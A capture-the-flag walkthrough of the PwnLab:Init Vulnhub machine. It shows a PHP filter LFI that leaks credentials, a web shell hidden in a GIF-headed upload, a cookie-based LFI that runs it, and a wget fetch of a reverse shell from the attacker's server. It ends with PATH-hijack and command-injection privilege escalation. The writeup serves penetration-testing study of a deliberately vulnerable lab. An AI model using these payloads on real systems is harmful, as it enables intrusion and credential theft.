---
published: false
---
# pwnlab_init - Vulnhub
Vulnhub virtual machine; On the path to OSCP this box offered PHP LFI, navigation of MySQL servers to extract data to privilege escalations through modifying PATH.


----------

Legal Usage:
*The information provided by execute@will is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risk/responsibilities.*

----------

Requirements: 
pwnlab_init.ova - virtualbox image
Kali Linux
configured internal virtual network

What you’ll learn:
PHP LFI
Navigating a MySQL Server - to extract data

source files: https://www.vulnhub.com/entry/pwnlab-init,158/

**ENUMERATION**

Begin by performing a netdiscover to find pwnlab_init vm on network

    netdiscover -r 192.168.56.1/24
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549493540025_image.png)


local ip: 192.168.56.102

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549493587573_image.png)


ping possible target: 192.168.56.101

    ping -c 3 192.168.56.101
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549493700894_image.png)


NMAP

    nmap -sV -sC -oA nmap/pwnlab.nmap 192.168.56.101
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549493994079_image.png)


Investigate port 80 via browser

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549494197640_image.png)


Investigate the source

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549494236096_image.png)


*“this server to upload and share image files inside the intranet” looks interesting*

Login page attempt possible SQL injection

    login: admin
    pass: ' or '1'='1

*no joy*

nikto scan

    nikto -h http://192.168.56.101
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549496054854_image.png)


/config.php found
/*images directory found worth investigating.*


investigate /config.php
navigating directly to the “config.php” yeilded no return but we could use the ?page=[insert command here] to try to extract the data.

LFI Vulnerability

    <?php  
       if (isset($_GET['page']))  
       {  
          include($_GET['page'] . '.php');  
       }  
    ?>  



using:

    http://192.168.56.101/?page=php://filter/convert.base64-encode/resource=config

returned:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549496500952_image.png)


*Base64 easily decoded to return credentials:*

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549496545959_image.png)


We now own creditals to the MySQL server

    user: root
    pass: H4u%QJ_H99

Connect to MySQL server:

    mysql -h 192.168.56.101 -u root -p
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549497412977_image.png)


Show the list of databases

    SHOW DATABASES
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549497720379_image.png)


access “Users”

    use Users
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549497829290_image.png)


show Tables

    show tables;
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549497869086_image.png)


retrieve all information from users table

    select * from users;
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549497990934_image.png)


*we now are in possession of 3 users and passwords which look to be base64 encoded*


    | kent | Sld6WHVCSkpOeQ== |  
    | mike | U0lmZHNURW42SQ== |  
    | kane | aVN2NVltMkdSbw== 
    
    decoded:
    JWzXuBJJNy
    SIfdsTEn6I
    iSv5Ym2GRo 
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549498215235_image.png)


Using the newly aquired usernames/passwords we can now attempt to login to gain access to the upload page to which we will upload a malicious payload.


Login as kent

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549501504246_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549501448741_image.png)


attempt to upload custom cmd file

    GIF89;
    <?php system($_GET["cmd"]) ?>
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549502392579_image.png)



upload the created file (pic.png in this example)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549502343435_image.png)


*verifying the file is accepted via Burp.*

Navigate to upload directory

    http://192.168.56.101/upload/
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549557409520_image.png)


*files are save in what looks like to be MD5 hash. In my case I uploaded two different files as a test. We can now use these files as the cookies.*


Inspect the index page

    http://192.168.56.101/?page=php://filter/convert.base64-encode/resource=index
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549555839059_image.png)


decode the base64

     echo PD9waHANCi8vTXVsdGlsaW5ndWFsLiBOb3QgaW1wbGVtZW50ZWQgeWV0Lg0KLy9zZXRjb29raWUoImxhbmciLCJlbi5sYW5nLnBocCIpOw0KaWYgKGlz
    c2V0KCRfQ09PS0lFWydsYW5nJ10pKQ0Kew0KCWluY2x1ZGUoImxhbmcvIi4kX0NPT0tJRVsnbGFuZyddKTsNCn0NCi8vIE5vdCBpbXBsZW1lbnRlZCB5ZXQuDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qd25MYWIgSW50cmFuZXQgSW1hZ2UgSG9zdGluZzwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8aW1nIHNyYz0iaW1hZ2VzL3B3bmxhYi5wbmciPjxiciAvPg0KWyA8YSBocmVmPSIvIj5Ib21lPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9bG9naW4iPkxvZ2luPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9dXBsb2FkIj5VcGxvYWQ8L2E+IF0NCjxoci8+PGJyLz4NCjw/cGhwDQoJaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKQ0KCXsNCgkJaW5jbHVkZSgkX0dFVFsncGFnZSddLiIucGhwIik7DQoJfQ0KCWVsc2UNCgl7DQoJCWVjaG8gIlVzZSB0aGlzIHNlcnZlciB0byB1cGxvYWQgYW5kIHNoYXJlIGltYWdlIGZpbGVzIGluc2lkZSB0aGUgaW50cmFuZXQiOw0KCX0NCj8+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4= | base64 --decode
    

*returns*

    <?php
    //Multilingual. Not implemented yet.
    //setcookie("lang","en.lang.php");
    if (isset($_COOKIE['lang']))
    {
            include("lang/".$_COOKIE['lang']);
    }
    // Not implemented yet.
    ?>
    <html>
    <head>
    <title>PwnLab Intranet Image Hosting</title>
    </head>
    <body>
    <center>
    <img src="images/pwnlab.png"><br />
    \[ <a href="/">Home</a> \] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]                                   
    <hr/><br/>
    <?php
            if (isset($_GET['page']))
            {
                    include($_GET['page'].".php");
            }
            else
            {
                    echo "Use this server to upload and share image files inside the intranet";                                          
            }
    ?>
    </center>
    </body>
    </html>

*Line #4 is important in that it states that “if(isset($_COOKIE[‘lang’]);” we will need to change our cookie.*

**LFI**
by changing the cookie to lang=[our command] we now have file/directory traversal.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549557012005_image.png)


add our image location of .png to the cookie field and test the file traversal

    Burp Post Request:
    POST /?cmd=ls HTTP/1.1
    Host: 192.168.56.101
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://192.168.56.101/?page=upload
    Cookie: PHPSESSID=m6o98c25ggubk4lsnjf2ra5ru7; lang=../upload/13cdb71f58255a6ba901942b03c8af3b.png
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549557697840_image.png)


now connecting to box - setup listener

    nc -lvnp 9000
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549557813199_image.png)


now to get our web shell to the box we will need to wget the files to the box. In my example I will use the php-reverse-shell (pentest monkey)located:

    /usr/share/webshell/php/php-reverse-shell.php

*make appropriate modifications to local ip and port*

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549559772633_image.png)


now save file as php.php

setup SimpleHTTPServer standard port 8000 will work

    python -m SimpleHTTPServer
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549559872920_image.png)


since our wget command will have spaces we will need to encode the command with Decoder to URL

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549559947860_image.png)


copy encoded URL to repeater after ?cmd=[insert encoded]

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549560037439_image.png)


acknowledge the request from the simplehttpserver

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549560079918_image.png)


check “?cmd=ls” to ensure file was received by webserver

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549560141449_image.png)


all that is left now is to execute php.php and watch our listener
navigate to: http://192.168.56.101/php.php
watch listener for connection

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549560214525_image.png)


*we are now www-data*

upgrade tty
Python method:

    python -c 'import pty; pty.spawn("/bin/bash")'
    press cntl+z 
    stty raw -echo
    fg (enter)
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549560399091_image.png)


*Upgraded shell*

Navigate to home folders

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549560492371_image.png)


*no access* 


switch users to kane

    su kane
    password: iSv5Ym2GRo
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549561521329_image.png)


*interesting file “msgmike”*

run msgmike

    ./msgmike
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549561619450_image.png)


*no such file or directory after it tries to cat /home/mike/msg.txt*

switch users to mike

    su mike
    password: SIfdsTEn6I
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549564921990_image.png)


*Authentication failure* 

Move to exploit PATH and abuse user with “.” 
more information found: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation

**PRIVESC**
echo path

    echo $PATH
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549565134838_image.png)


msg mike might be functioning as:

    int main()  
    {  
          system("cat /home/mike/msg.txt");  
    }

we just need to modify bin/bash to cat from this poorly configured binary who is calling PATH.

    echo "bin/bash" > cat

change chmod

    chmod 777 cat

export kane’s path

    export PATH=/home/kane
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549565821323_image.png)


*we are now mike and need to move to root*

Reset PATH variable first

    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549565957051_image.png)


*move to mike home folder and notice “msg2root”*

run msg2root

    ./msg2root
![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549566046937_image.png)


check strings

    mike@pwnlab:/home/mike$ strings msg2root                                                                                     
    /lib/ld-linux.so.2                                                                                                           
    libc.so.6                                                                                                                    
    _IO_stdin_used                                                                                                               
    stdin                                                                                                                        
    fgets                                                                                                                        
    asprintf                                                                                                                     
    system                                                                                                                       
    __libc_start_main                                                                                                            
    __gmon_start__                                                                                                               
    GLIBC_2.0                                                                                                                    
    PTRh                                                                                                                         
    [^_]                                                                                                                         
    Message for root:                                                                                                            
    /bin/echo %s >> /root/messages.txt                                                                                           
    ;*2$"(                                                                                                                       
    GCC: (Debian 4.9.2-10) 4.9.2                                                                                                 
    GCC: (Debian 4.8.4-1) 4.8.4                                                                                                  
    .symtab                                                                                                                      
    .strtab
    .shstrtab
    .interp
    .note.ABI-tag

*“/bin/echo %s >> /root/messages.txt” very interesting*

**ROOT**
move to open msg2root with an extra bash -p to preserve root attributes

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549566347538_image.png)


*we are ROOT*

navigate to the goods

![](https://d2mxuefqeaa7sj.cloudfront.net/s_B2C149E1D9F8DB901CD74EB01CB7DA578B9214EFC6F7862C2D42B14EB54B6452_1549566480666_image.png)



TADA! -exec





